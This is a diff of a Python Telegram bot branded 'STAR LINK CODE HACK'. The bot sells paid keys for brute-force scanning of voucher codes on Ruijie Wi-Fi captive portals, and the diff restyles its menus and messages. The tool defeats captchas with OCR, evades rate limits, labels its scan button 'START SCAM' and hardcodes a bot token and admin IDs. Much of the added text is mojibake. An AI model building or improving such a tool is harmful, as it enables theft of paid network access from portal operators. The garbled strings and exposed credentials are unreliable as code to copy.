@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-STAR LINK CODE HACK — Ultimate Edition v4.0
+STAR LINK CODE HACK â€” Ultimate Edition v4.0
 ============================================
-Maximum speed • Maximum accuracy • Zero bugs • Premium UX
+Maximum speed â€¢ Maximum accuracy â€¢ Zero bugs â€¢ Premium UX
 Features: Session pool, Multi-pass OCR, Resume, ETA, Smart rate-limit,
           Success alerts, Live admin dashboard, Proxy-ready
 """
@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import asyncio
 import base64
+import json
 import logging
 import os
 import random
@@ -30,17 +31,21 @@ import ddddocr
 import numpy as np
 from aiohttp import web
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 
 # ============================================================
 # CONFIGURATION (hardcoded as requested)
 # ============================================================
-BOT_TOKEN: str = "8706721477:AAH8SDzBKuRAR-7rcIKWB1FvgOwIMEwiepI"
+BOT_TOKEN: str = "8706721477:AAGEZEbKBfI2gBHi6taWj1ToH2-EStFF6HI"
 ADMINS: Tuple[str, ...] = ("8797803204",)
 ADMIN_USERNAME: str = "@Nytheris_q"
 
 DB_PATH: str = os.environ.get("DB_PATH", "bot_data.db")
 WEB_PORT: int = int(os.environ.get("PORT") or os.environ.get("BOT_PORT") or "8099")
+
+# Mini App URL (set WEBAPP_URL env on Railway, e.g. https://your-app.up.railway.app/app)
+_WEBAPP_URL: str = os.environ.get("WEBAPP_URL", "").rstrip("/")
+WEBAPP_DIR: str = os.path.join(os.path.dirname(os.path.abspath(__file__)), "webapp")
 
 # Speed / stability tuning
 MAX_CONCURRENT_SCANS: int = 20
@@ -358,7 +363,7 @@ def minute_to_hour(total_minutes: Any) -> str:
 
 def format_eta(seconds: float) -> str:
     if seconds <= 0 or seconds > 86400 * 30:
-        return "—"
+        return "â€”"
     s = int(seconds)
     h, rem = divmod(s, 3600)
     m, sec = divmod(rem, 60)
@@ -376,70 +381,86 @@ bot = AsyncTeleBot(BOT_TOKEN)
 # ============================================================
 # KEYBOARDS
 # ============================================================
-def get_main_keyboard() -> InlineKeyboardMarkup:
+def _webapp_url(paid: bool = False) -> Optional[str]:
+    """Resolve Mini App public HTTPS URL."""
+    base = _WEBAPP_URL
+    if not base:
+        # Railway auto domain
+        domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
+        if domain:
+            if not domain.startswith("http"):
+                domain = "https://" + domain
+            base = domain.rstrip("/")
+    if not base:
+        return None
+    q = "?paid=1" if paid else ""
+    return f"{base}/app/{q}" if base.endswith("/app") else f"{base}/app{q}"
+
+
+def get_main_keyboard(paid: bool = False) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
-        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
-        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
-        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
-        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
+    app_url = _webapp_url(paid=paid)
+    if app_url:
+        kb.row(InlineKeyboardButton(
+            "âœ¨  Premium Menu  âœ¨",
+            web_app=WebAppInfo(url=app_url),
+        ))
+    kb.row(InlineKeyboardButton("ðŸš€  SCAN á€…á€á€„á€ºá€™á€Šá€º", callback_data="menu_free_trial"))
+    kb.row(
+        InlineKeyboardButton("ðŸŽ«  Paid User", callback_data="menu_paid"),
+        InlineKeyboardButton("ðŸ“‹  Success Codes", callback_data="menu_result"),
     )
+    kb.row(
+        InlineKeyboardButton("ðŸ”„  Recheck", callback_data="menu_recheck"),
+        InlineKeyboardButton("ðŸ›‘  Scan á€›á€•á€ºá€™á€Šá€º", callback_data="menu_stop"),
+    )
+    kb.row(InlineKeyboardButton("ðŸ   á€•á€„á€ºá€™á€…á€¬á€™á€»á€€á€ºá€”á€¾á€¬", callback_data="menu_back"))
     return kb
 
 def get_voucher_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
-        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
-        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
-        InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
-        InlineKeyboardButton("🔤 ascii-lower 6", callback_data="scan_ascii-lower"),
-        InlineKeyboardButton("🔤 ascii-lower 9", callback_data="scan_ascii-lower9"),
-        InlineKeyboardButton("🎲 all 6", callback_data="scan_all"),
-        InlineKeyboardButton("🔤+🔢 MIXED 6", callback_data="scan_mixed"),
-        InlineKeyboardButton("🔤+🔢 MIXED 8", callback_data="scan_mixed8"),
-        InlineKeyboardButton("🔤+🔢 MIXED 9", callback_data="scan_mixed9"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
-    )
+    kb.row(InlineKeyboardButton("ðŸ”¢  6 á€œá€¯á€¶á€¸", callback_data="scan_6"),
+           InlineKeyboardButton("ðŸ”¢  7 á€œá€¯á€¶á€¸", callback_data="scan_7"))
+    kb.row(InlineKeyboardButton("ðŸ”¢  8 á€œá€¯á€¶á€¸", callback_data="scan_8"),
+           InlineKeyboardButton("ðŸ”¢  9 á€œá€¯á€¶á€¸", callback_data="scan_9"))
+    kb.row(InlineKeyboardButton("ðŸ”¤  a-z 6", callback_data="scan_ascii-lower"),
+           InlineKeyboardButton("ðŸ”¤  a-z 9", callback_data="scan_ascii-lower9"))
+    kb.row(InlineKeyboardButton("ðŸŽ²  Random 6", callback_data="scan_all"),
+           InlineKeyboardButton("ðŸ”   Mixed 6", callback_data="scan_mixed"))
+    kb.row(InlineKeyboardButton("ðŸ”   Mixed 8", callback_data="scan_mixed8"),
+           InlineKeyboardButton("ðŸ”   Mixed 9", callback_data="scan_mixed9"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=5)
-    btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
+    btns = [InlineKeyboardButton(f"{i}", callback_data=f"digit_{mode}_{i}") for i in range(10)]
     kb.add(*btns)
-    kb.add(InlineKeyboardButton("🎲 Random Start", callback_data=f"digit_{mode}_random"))
-    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
+    kb.row(InlineKeyboardButton("ðŸŽ²  Random Start", callback_data=f"digit_{mode}_random"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 def get_start_scam_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
-    )
+    kb.row(InlineKeyboardButton("ðŸš€  START SCAN  ðŸ”¥", callback_data="menu_start_scam"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 def get_paid_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
-    )
+    kb.row(InlineKeyboardButton("âœ…  Paid User á€–á€¼á€…á€ºá€›á€”á€º", callback_data="menu_enter_userid"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 def get_back_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 def get_scam_button_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
-        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
-    )
+    kb.row(InlineKeyboardButton("ðŸ›‘  STOP SCAN", callback_data="menu_stop"))
+    kb.row(InlineKeyboardButton("â¬…ï¸  á€”á€±á€¬á€€á€ºá€žá€­á€¯á€·", callback_data="menu_back"))
     return kb
 
 # ============================================================
@@ -522,22 +543,22 @@ async def safe_send(
 def format_success_entry(code: str, plan_info: str) -> str:
     """plan_info already contains multi-line detailed HTML."""
     return (
-        f"┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
-        f"┃ 🎫 <b><code>{code}</code></b>\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“\n"
+        f"â”ƒ ðŸŽ« <b><code>{code}</code></b>\n"
         f"{plan_info}"
-        f"┗━━━━━━━━━━━━━━━━━━━━━━┛"
+        f"â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›"
     )
 
 def format_premium_success_list(entries: List[str]) -> str:
     header = (
-        "✨ <b>STAR LINK — SUCCESS CODES</b> ✨\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "âœ¨ <b>STAR LINK â€” SUCCESS CODES</b> âœ¨\n"
+        "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
     )
     body = "\n\n".join(entries)
     footer = (
-        f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 Total Found: <b>{len(entries)}</b>\n"
-        f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
+        f"\n\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"ðŸ“Š Total Found: <b>{len(entries)}</b>\n"
+        f"â° {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
     )
     return header + body + footer
 
@@ -556,24 +577,24 @@ def format_progress(
         bar_len = 18
         pct = min(100.0, (checked / total) * 100)
         filled = min(bar_len, int(pct / (100 / bar_len)))
-        bar = "█" * filled + "░" * (bar_len - filled)
+        bar = "â–ˆ" * filled + "â–‘" * (bar_len - filled)
         return (
-            f"🔍 <b>Scanning…</b>  <code>{mode}</code>\n\n"
-            f"📦 Checked : <b>{checked:,}</b> / {total:,}\n"
-            f"📊 Progress : <b>{pct:.1f}%</b>\n"
-            f"⚡ Speed    : <b>{speed_str}</b>\n"
-            f"⏱ ETA      : <b>{eta}</b>\n"
-            f"✅ Hits     : <b>{found}</b>\n"
-            f"🛡 RateLimit: {rate_limit_hits}\n\n"
+            f"ðŸ” <b>Scanningâ€¦</b>  <code>{mode}</code>\n\n"
+            f"ðŸ“¦ Checked : <b>{checked:,}</b> / {total:,}\n"
+            f"ðŸ“Š Progress : <b>{pct:.1f}%</b>\n"
+            f"âš¡ Speed    : <b>{speed_str}</b>\n"
+            f"â± ETA      : <b>{eta}</b>\n"
+            f"âœ… Hits     : <b>{found}</b>\n"
+            f"ðŸ›¡ RateLimit: {rate_limit_hits}\n\n"
             f"<code>[{bar}]</code>"
         )
     return (
-        f"🔍 <b>Scanning…</b>  <code>{mode}</code>\n\n"
-        f"📦 Checked : <b>{checked:,}</b>\n"
-        f"⚡ Speed    : <b>{speed_str}</b>\n"
-        f"✅ Hits     : <b>{found}</b>\n"
-        f"🛡 RateLimit: {rate_limit_hits}\n\n"
-        f"📊 Status  : <i>running (random / infinite)</i>"
+        f"ðŸ” <b>Scanningâ€¦</b>  <code>{mode}</code>\n\n"
+        f"ðŸ“¦ Checked : <b>{checked:,}</b>\n"
+        f"âš¡ Speed    : <b>{speed_str}</b>\n"
+        f"âœ… Hits     : <b>{found}</b>\n"
+        f"ðŸ›¡ RateLimit: {rate_limit_hits}\n\n"
+        f"ðŸ“Š Status  : <i>running (random / infinite)</i>"
     )
 
 # ============================================================
@@ -586,28 +607,28 @@ async def cmd_start(message):
     user_name = message.from_user.first_name or message.from_user.username or "User"
     user_data.setdefault(chat_id, {})
 
-    if await is_paid(user_id):
+    paid = await is_paid(user_id)
+    if paid:
         paid_users.add(user_id)
         welcome = (
-            "✨ <b>STAR LINK CODE HACK</b> ✨\n"
-            "<i>Ultimate Edition v4.0</i>\n\n"
-            f"🪪 <b>NAME</b>: {user_name}\n"
-            f"📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
-            "🎁 မင်္ဂလာပါခင်ဗျာ!\n"
-            "🎫 သင့်အနေနဲ့ <b>PAID USER</b> ဖြစ်ပါတယ်။\n"
-            "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\n"
-            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
+            "âœ¨ <b>STAR LINK</b> âœ¨\n"
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+            f"ðŸ‘¤ {user_name}\n"
+            f"ðŸ†” <code>{user_id}</code>\n\n"
+            "ðŸ’Ž <b>Paid User</b> Â· Unlimited Access\n"
+            "á€¡á€±á€¬á€€á€ºá€€ Menu á€™á€¾ á€›á€½á€±á€¸á€•á€« ðŸ‘‡"
         )
     else:
         welcome = (
-            "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
-            f"🪪 <b>NAME</b>: {user_name}\n"
-            f"📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
-            "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            "PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
-            f"👨‍💻 Admin: {ADMIN_USERNAME}"
+            "âœ¨ <b>STAR LINK</b> âœ¨\n"
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+            f"ðŸ‘¤ {user_name}\n"
+            f"ðŸ†” <code>{user_id}</code>\n\n"
+            "âš ï¸ á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«\n"
+            "ðŸŽ« <b>Paid User</b> á€€á€­á€¯á€”á€¾á€­á€•á€ºá€•á€¼á€®á€¸ Key á€›á€šá€°á€•á€«\n"
+            f"ðŸ‘¨â€ðŸ’» {ADMIN_USERNAME}"
         )
-    await safe_send(chat_id, welcome, reply_markup=get_main_keyboard())
+    await safe_send(chat_id, welcome, reply_markup=get_main_keyboard(paid=paid))
 
 @bot.message_handler(commands=["sendall"])
 async def cmd_sendall(message):
@@ -617,7 +638,7 @@ async def cmd_sendall(message):
     if len(args) < 2:
         await bot.reply_to(message, "Usage: /sendall [message]")
         return
-    body = f"📢 <b>ADMIN NOTIFICATION</b>\n\n{args[1]}"
+    body = f"ðŸ“¢ <b>ADMIN NOTIFICATION</b>\n\n{args[1]}"
     auth = await db_get_auth_list()
     sent = failed = 0
     for uid in auth:
@@ -627,14 +648,14 @@ async def cmd_sendall(message):
             await asyncio.sleep(0.04)
         except Exception:
             failed += 1
-    await bot.reply_to(message, f"✅ Sent: {sent} | ❌ Failed: {failed}")
+    await bot.reply_to(message, f"âœ… Sent: {sent} | âŒ Failed: {failed}")
 
 @bot.message_handler(commands=["key"])
 async def cmd_key(message):
     args = message.text.split()
     user_id = str(message.chat.id)
     if len(args) < 2:
-        await bot.reply_to(message, "🔑 ကျေးဇူးပြု၍ KEY ကိုထည့်ပါ:\n/key [your_key]")
+        await bot.reply_to(message, "ðŸ”‘ á€€á€»á€±á€¸á€‡á€°á€¸á€•á€¼á€¯á KEY á€€á€­á€¯á€‘á€Šá€·á€ºá€•á€«:\n/key [your_key]")
         return
     key = args[1]
     auth = await db_get_auth_list()
@@ -648,17 +669,17 @@ async def cmd_key(message):
         user_data.setdefault(message.chat.id, {})
         await bot.reply_to(
             message,
-            f"✅ <b>PAID USER</b> ဖြစ်ပါပြီ။\n\nUSER ID: <code>{user_id}</code>\n\n"
-            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
+            f"âœ… <b>PAID USER</b> á€–á€¼á€…á€ºá€•á€«á€•á€¼á€®á‹\n\nUSER ID: <code>{user_id}</code>\n\n"
+            "á€¡á€±á€¬á€€á€ºá€•á€« Menu á€™á€¾ á€žá€„á€ºá€œá€­á€¯á€á€»á€„á€ºá€á€¬á€€á€­á€¯á€›á€½á€±á€¸á€á€»á€šá€ºá€•á€«á‹",
             parse_mode="HTML",
         )
     elif target_uid:
-        await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
+        await bot.reply_to(message, "âŒ Key Expired á€–á€¼á€…á€ºá€”á€±á€•á€«á€žá€Šá€ºá‹")
     else:
         await bot.reply_to(
             message,
-            f"❌ Key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: <code>{user_id}</code>\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"âŒ Key á€€á€­á€¯ registered á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«á‹\n\nUSER ID: <code>{user_id}</code>\n\n"
+            f"PAID USER á€–á€¼á€…á€ºá€›á€”á€º Admin {ADMIN_USERNAME} á€žá€­á€¯á€· á€†á€€á€ºá€žá€½á€šá€ºá€•á€«á‹",
             parse_mode="HTML",
         )
 
@@ -673,7 +694,7 @@ async def cmd_genkey(message):
         return
     plan, user_id = args[1], args[2]
     if not user_id.isdigit():
-        await bot.reply_to(message, "❌ user_id သည် ဂဏန်းဖြစ်ရပါမည်။")
+        await bot.reply_to(message, "âŒ user_id á€žá€Šá€º á€‚á€á€”á€ºá€¸á€–á€¼á€…á€ºá€›á€•á€«á€™á€Šá€ºá‹")
         return
     expiry = generate_expiry(plan)
     if not expiry:
@@ -684,7 +705,7 @@ async def cmd_genkey(message):
         paid_users.add(user_id)
     await bot.reply_to(
         message,
-        f"✅ <b>Key Generated</b>\n\nUSER ID : <code>{user_id}</code>\nPLAN    : {plan}\nEXPIRES : {expiry}",
+        f"âœ… <b>Key Generated</b>\n\nUSER ID : <code>{user_id}</code>\nPLAN    : {plan}\nEXPIRES : {expiry}",
         parse_mode="HTML",
     )
     log.info("genkey %s plan=%s by admin %s", user_id, plan, message.chat.id)
@@ -701,13 +722,13 @@ async def cmd_delkey(message):
     user_id = args[1]
     auth = await db_get_auth_list()
     if user_id not in auth:
-        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
+        await bot.reply_to(message, f"User ID {user_id} á€™á€á€½á€±á€·á€•á€«á‹")
         return
     await db_delete_key(user_id)
     paid_users.discard(user_id)
     if user_id.isdigit():
         user_data.pop(int(user_id), None)
-    await bot.reply_to(message, f"✅ Key Deleted\nUSER ID : <code>{user_id}</code>", parse_mode="HTML")
+    await bot.reply_to(message, f"âœ… Key Deleted\nUSER ID : <code>{user_id}</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=["listkeys"])
 async def cmd_listkeys(message):
@@ -716,7 +737,7 @@ async def cmd_listkeys(message):
         return
     auth = await db_get_auth_list()
     if not auth:
-        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
+        await bot.reply_to(message, "Registered key á€™á€›á€¾á€­á€žá€±á€¸á€•á€«á‹")
         return
     lines: List[str] = []
     now = datetime.now(timezone.utc)
@@ -738,8 +759,8 @@ async def cmd_listkeys(message):
                     exp_str = f"{d}d {h}h {m}m left"
             except Exception:
                 exp_str = expires
-        lines.append(f"🪪 <code>{uid}</code>\n   Plan: {plan}\n   Expires: {exp_str}")
-    text = f"📋 <b>Registered Keys</b> ({len(auth)})\n\n" + "\n\n".join(lines)
+        lines.append(f"ðŸªª <code>{uid}</code>\n   Plan: {plan}\n   Expires: {exp_str}")
+    text = f"ðŸ“‹ <b>Registered Keys</b> ({len(auth)})\n\n" + "\n\n".join(lines)
     if len(text) <= 4096:
         await bot.reply_to(message, text, parse_mode="HTML")
     else:
@@ -752,15 +773,15 @@ async def cmd_result(message):
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"âŒ á€žá€„á€ºá user ID á€€á€­á€¯ registered á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«á‹\n\n"
+            f"PAID USER á€–á€¼á€…á€ºá€›á€”á€º Admin {ADMIN_USERNAME} á€žá€­á€¯á€· á€†á€€á€ºá€žá€½á€šá€ºá€•á€«á‹",
         )
         return
     results = await db_get_results(user_id)
     if not results:
-        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
+        await bot.reply_to(message, "á€žá€„á€·á€ºá€á€½á€„á€º á€šá€á€„á€ºá€€á€›á€›á€¾á€­á€‘á€¬á€¸á€žá€±á€¬ code á€™á€›á€¾á€­á€žá€±á€¸á€•á€«á‹")
         return
-    entries = [f"🎫 <code>{c}</code>" for c in results]
+    entries = [f"ðŸŽ« <code>{c}</code>" for c in results]
     body = format_premium_success_list(entries)
     if len(body) <= 4096:
         await bot.reply_to(message, body, parse_mode="HTML")
@@ -774,37 +795,37 @@ async def cmd_portal(message):
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"âŒ á€žá€„á€ºá user ID á€€á€­á€¯ registered á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«á‹\n\n"
+            f"PAID USER á€–á€¼á€…á€ºá€›á€”á€º Admin {ADMIN_USERNAME} á€žá€­á€¯á€· á€†á€€á€ºá€žá€½á€šá€ºá€•á€«á‹",
         )
         return
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
         await bot.reply_to(
             message,
-            "🔗 Portal URL ထည့်ရန်:\n\n/portal [your_portal_url]\n\n"
-            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
+            "ðŸ”— Portal URL á€‘á€Šá€·á€ºá€›á€”á€º:\n\n/portal [your_portal_url]\n\n"
+            "á€¥á€•á€™á€¬:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
         )
         return
     url = args[1].strip()
     if not url.startswith(("http://", "https://")):
-        await bot.reply_to(message, "❌ URL သည် http:// သို့မဟုတ် https:// ဖြင့် စရပါမည်။")
+        await bot.reply_to(message, "âŒ URL á€žá€Šá€º http:// á€žá€­á€¯á€·á€™á€Ÿá€¯á€á€º https:// á€–á€¼á€„á€·á€º á€…á€›á€•á€«á€™á€Šá€ºá‹")
         return
     user_data.setdefault(message.chat.id, {})
-    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
+    await bot.reply_to(message, "ðŸ”— Portal URL á€¡á€¬á€¸á€…á€…á€ºá€†á€±á€¸á€”á€±á€•á€«á€žá€Šá€º...")
     if await check_session_url_improved(url):
         user_data[message.chat.id]["session_url"] = url
         await bot.reply_to(
             message,
-            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
+            "âœ… Portal á€žá€­á€™á€ºá€¸á€•á€¼á€®á€¸á€•á€«á€•á€¼á€®\nVoucher á€¡á€™á€»á€­á€¯á€¸á€¡á€…á€¬á€¸ á€›á€½á€±á€¸á€•á€« ðŸ‘‡",
             reply_markup=get_voucher_keyboard(),
         )
     else:
         await bot.reply_to(
             message,
-            "❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်စစ်ပါ။\n\n"
-            "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
-            "<code>https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00</code>",
+            "âŒ Portal URL á€™á€¾á€¬á€¸á€”á€±á€•á€«á€á€šá€º\n\n"
+            "âœ… á€™á€¾á€”á€ºá€€á€”á€ºá€á€²á€· á€•á€¯á€¶á€…á€¶:\n"
+            "<code>https://portal-as.ruijienetworks.com/.../index.html?lang=en_US&mac=...</code>",
             parse_mode="HTML",
         )
 
@@ -814,7 +835,7 @@ async def cmd_scan(message):
     if len(args) < 2:
         await bot.reply_to(
             message,
-            "VOUCHER ရွေးချယ်ရန်:\n\n"
+            "VOUCHER á€›á€½á€±á€¸á€á€»á€šá€ºá€›á€”á€º:\n\n"
             "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
             reply_markup=get_voucher_keyboard(),
         )
@@ -833,18 +854,18 @@ async def _start_scan(
     if not await is_paid(user_id):
         await safe_send(
             chat_id,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"âŒ á€žá€„á€ºá user ID á€€á€­á€¯ registered á€™á€œá€¯á€•á€ºá€›á€žá€±á€¸á€•á€«á‹\n\n"
+            f"PAID USER á€–á€¼á€…á€ºá€›á€”á€º Admin {ADMIN_USERNAME} á€žá€­á€¯á€· á€†á€€á€ºá€žá€½á€šá€ºá€•á€«á‹",
         )
         return False
 
     if chat_id not in user_data or "session_url" not in user_data[chat_id]:
-        await safe_send(chat_id, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
+        await safe_send(chat_id, "ðŸ”— Portal URL á€¡á€›á€„á€ºá€‘á€Šá€·á€ºá€•á€«\n<code>/portal [URL]</code>")
         return False
 
     existing = scan_tasks.get(chat_id)
     if existing and not existing["task"].done():
-        await safe_send(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
+        await safe_send(chat_id, "âš¡ Scan á€œá€¯á€•á€ºá€”á€±á€•á€¼á€®á€¸á€žá€¬á€¸á€•á€«\nðŸ›‘ STOP á€”á€²á€· á€›á€•á€ºá€”á€­á€¯á€„á€ºá€•á€«á€á€šá€º")
         return False
 
     try:
@@ -860,14 +881,14 @@ async def _start_scan(
     if not await acquire_scan_slot():
         await safe_send(
             chat_id,
-            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခဏစောင့်ပါ။",
+            f"âš ï¸ Bot á€¡á€œá€¯á€•á€ºá€™á€»á€¬á€¸á€”á€±á€•á€«á€á€šá€º ({active_scans_count}/{MAX_CONCURRENT_SCANS})\ná€á€á€…á€±á€¬á€„á€·á€ºá€•á€«â€¦",
         )
         return False
 
     try:
         progress_msg = await bot.send_message(
             chat_id,
-            f"🔍 <b>Voucher Code ရှာဖွေနေသည်...</b>\n<code>{mode}</code>",
+            f"ðŸ” <b>Scan á€œá€¯á€•á€ºá€”á€±á€•á€«á€á€šá€ºâ€¦</b>\nðŸŽ¯ <code>{mode}</code>",
             parse_mode="HTML",
         )
     except Exception as e:
@@ -888,11 +909,11 @@ async def _start_scan(
         last_url = user_data[chat_id].get("last_admin_notified_url", "")
         if portal_url != last_url and portal_url != "Unknown":
             admin_msg = (
-                "🚀 <b>Scan Start</b>\n\n"
-                f"🪪 User: {user_name}\n"
-                f"📜 User ID: <code>{user_id}</code>\n"
-                f"🔢 Mode: <code>{mode}</code>\n"
-                f"🔗 URL: {portal_url}"
+                "ðŸš€ <b>Scan Start</b>\n\n"
+                f"ðŸªª User: {user_name}\n"
+                f"ðŸ“œ User ID: <code>{user_id}</code>\n"
+                f"ðŸ”¢ Mode: <code>{mode}</code>\n"
+                f"ðŸ”— URL: {portal_url}"
             )
             for admin_id in ADMINS:
                 await safe_send(int(admin_id), admin_msg)
@@ -908,7 +929,7 @@ async def _start_scan(
         user_data[chat_id]["resume_from"] = resume_from
         await safe_send(
             chat_id,
-            f"⏯ Resume detected — continuing from <code>{resume_from}</code>",
+            f"â¯ Resume detected â€” continuing from <code>{resume_from}</code>",
             disable_notification=True,
         )
 
@@ -935,9 +956,9 @@ async def cmd_stop(message):
         data["stop"] = True
         data["scan_id"] = None
         data["task"].cancel()
-        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
+        await bot.reply_to(message, "ðŸ›‘ Scan á€€á€­á€¯ á€›á€•á€ºá€á€”á€·á€ºá€•á€¼á€®á€¸á€•á€«á€•á€¼á€®á‹", reply_markup=get_back_keyboard())
     else:
-        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())
